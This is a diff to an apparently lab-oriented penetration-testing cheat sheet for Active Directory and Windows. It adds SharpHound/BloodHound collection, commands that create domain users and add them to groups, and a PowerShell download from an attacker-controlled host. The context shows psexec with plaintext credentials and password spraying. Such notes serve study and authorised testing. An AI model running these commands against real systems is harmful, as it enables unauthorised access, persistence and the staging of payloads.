@@ -303,6 +303,7 @@ crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
 ## Shell Access with Credentials
 
 :information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.
+:information_source: If winrm port is open, see [evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
 ``` bash
 psexec.py whiterose.local/ealderson:Password!@192.168.92.129
@@ -436,10 +437,16 @@ powershell -ep bypass
 Invoke-Bloodhound -CollectionMethod All -Domain WHITEROSE.local -ZipFileName file.zip 
 ```
 
+You can also use the .exe
+```
+.\SharpHound.exe -c all
+```
+
 Transfer the zip file to kali instance and load it into bloodhound to visualize.
 
-:information_source: Install bloodhound using apt
-:information_source: bloodhound depends on neo4j
+:information_source: Install bloodhound using apt or download git repository
+:information_source: bloodhound depends on neo4j so make sure it is installed
+:information_source: good starting point are prebuild queries. see 'shortest path to high value targets'
 
 # Active Directory Post-Compromise Attacks
 
@@ -1240,7 +1247,21 @@ cadaver http://10.10.10.15/mfu
 ```
 
 # PowerShell
-## Commands
+## User Management
+* add user
+```
+net user <username> <password> /add /domain
+```
+* add user to group
+```
+net group <group> <username> /add
+```
+## Transfer Files
+```
+IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/file", "C:\Users\user\Desktop\file")
+Copy-Item \\10.10.14.13\share\file C:\Users\user\Desktop\file
+```
+## Misc Commands
 ### Get-ChildItem
 * ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
 * ```-File``` / -Directory To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.
